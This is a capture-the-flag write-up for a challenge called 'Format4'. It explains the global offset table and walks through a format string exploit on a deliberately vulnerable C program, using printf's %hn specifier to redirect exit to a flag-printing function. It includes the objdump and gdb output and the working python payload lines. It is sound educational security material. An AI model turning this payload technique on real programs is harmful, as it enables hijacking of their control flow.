---
title:  "Writeup: Format4"
date:   2019-04-22 14:00:00
categories: writeup
author: Tim Winters
layout: post
---

```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

int target;

void hello()
{
  printf("code execution redirected! you win\n");

  char flagBuffer[64];
  FILE *fp;
  fp = fopen("./flag.txt", "r");
  fgets(flagBuffer, 64, (FILE *) fp);
  printf("flag: %s\n", flagBuffer);

  _exit(1);
}

void vuln()
{
  char buffer[512];

  fgets(buffer, sizeof(buffer), stdin);

  printf(buffer);

  exit(1);
}

int main(int argc, char **argv)
{
  vuln();
}
```

It is obvious we need to call `hello`, but it won't be as easy as overwriting the return address, since the `exit` function is called, and we never return to `main`. 

The hint for this challenge is 
> What is the global offset table?

The Global Offset Table is, as I understand it, a middleman to connect our executable with the standard C library. For example, when we call `printf`, instead of including all the code in our binary, we use the library function. 

We could hard code the address of `printf` into our binary, but then any time stdlib changed, we would need to recompile our binary. 

Instead, we rely on the linker/loader to populate the `got` with the address of `printf`. 

---
Now that we understand the `got`, we can start our attack. The goal is to overwrite the address of `exit` with the address of `hello`, so that at the end of `vuln` we redirect there. 

Because the name of the challenge is "format4" we will use a format string exploit. In particular, we will use the `%n` specifier to overwrite the address of `exit`. 

---
## The Solution
Let's begin by determining the address we need to overwrite. 

To find the address, we can use `objdump`

```
> objdump -TR format4

format4:     file format elf32-i386

DYNAMIC SYMBOL TABLE:
00000000      DF *UND*	00000000  GLIBC_2.0   printf
00000000      DF *UND*	00000000  GLIBC_2.0   _exit
00000000      DF *UND*	00000000  GLIBC_2.0   fgets
00000000      DF *UND*	00000000  GLIBC_2.0   puts
00000000  w   D  *UND*	00000000              __gmon_start__
00000000      DF *UND*	00000000  GLIBC_2.0   exit
00000000      DF *UND*	00000000  GLIBC_2.0   __libc_start_main
00000000      DF *UND*	00000000  GLIBC_2.1   fopen
0804868c g    DO .rodata	00000004  Base        _IO_stdin_used
0804a040 g    DO .bss	00000004  GLIBC_2.0   stdin


DYNAMIC RELOCATION RECORDS
OFFSET   TYPE              VALUE
08049ffc R_386_GLOB_DAT    __gmon_start__
0804a040 R_386_COPY        stdin@@GLIBC_2.0
0804a00c R_386_JUMP_SLOT   printf@GLIBC_2.0
0804a010 R_386_JUMP_SLOT   _exit@GLIBC_2.0
0804a014 R_386_JUMP_SLOT   fgets@GLIBC_2.0
0804a018 R_386_JUMP_SLOT   puts@GLIBC_2.0
0804a01c R_386_JUMP_SLOT   exit@GLIBC_2.0
0804a020 R_386_JUMP_SLOT   __libc_start_main@GLIBC_2.0
0804a024 R_386_JUMP_SLOT   fopen@GLIBC_2.1
```
In the second half of the output we can see that `exit` is at `0x0804a01c`. Let's see what is at this address. 

```
gdb-peda$ x/xw 0x0804a01c
0x804a01c:	0x08048406
gdb-peda$ x/xw *0x0804a01c
0x8048406 <exit@plt+6>:	0x00002068
```
So it looks like the entry for `exit` in the `got` points to `exit` in the `plt`. We can overwrite this value to point to the address of `hello` in the `plt`. To get that address, just use `p hello` in `gdb`.

```
gdb-peda$ p hello
$1 = {void ()} 0x804853b <hello>
```

Now we can construct our format string. We need to print  `0x804853b` characters then use `%n`. Plugging that into a calculator we get...134,513,979...I don't think that many characters will fit in the stack...so we need something else. 

Luckily, the `%n` format specifier comes with a friend, `%h`. `%h` lets us write just two bytes at a time, rather than all 4. Now our value will max out at 65535, much more reasonable. 

Let's look at the two addresses again

```
current got entry: 0x804a01c  
target got entry:  0x804853b
```
Lucky for us, the upper two bytes are identical, so we only need to write the lower two bytes. 

`0x853b = 34107`
So we need to write 34107 characters. That's...still too many (at least for python to handle). But there is another way. We can change the width of a single character such that `%n` increments, but our stack doesn't get destroyed. For example, if we do `%34107x` it will print out the next 4 bytes (length of integer) in hexadecimal without `0x` preceding, but padded with blank spaces such that the total length is 34107.

Let's start building our formatted string. 

`\x1c\xa0\x04\x08%34103x%hn`

Notice we use 34103 rather than 34107, becase we must take the 4 bytes of the address into account. 

The `%n` specifier can also take numbers, but they do something a little different. They determine which value on the stack we use as the address. `%1$hn` uses the first value, `%2$hn` uses the second, etc. 

To determine which value we want to use, we need to examine the stack. We can replace the `%hn` with `%x.` (the period acts as aa deliminator) to view the next values on the stack.

```
> python -c "print '\x1c\xa0a\x04\x08%34103x' + '%x.'*10" | ./format4
200f7fc55a0.f7ff010a.804a01c.31343325.25783330.78252e78.2e78252e.252e7825.78252e78.2e78252e.
```
It looks like our output is the 4th value. Let's pop the first 3 off the stack so that our value is the very first one. 

```
------------------------------------------v this is the first one
> python -c "print '\x1c\xa0\x04\x08%34103x' + '%x.'*2 + '%x'" | ./format4
200f7fc55a0.f7ff010a.461a01c.34332508.78333031.252e7825.78252e78.2e78252e.252e7825.78252e78
```
The last `%x` shows our value. If we replace it with `%hn`, it should overwrite the first two bytes at that address. 

```
> python -c "print '\x1c\xa0\x04\x08%34103x' + '%x'*2 + '%hn'" | ./format4
Illegal Instruction (core dumped)
```
hmmm...ah. We didn't reduce our 'counter' to account for the 2 `%x`s we put in before `%hn`. 

```
> python -c "print '\x1c\xa0\x04\x08%34101x' + '%x'*2 + '%hn'" | ./format4
flag: 61e3db641ad7cee82e6dcd73292bfae7
```



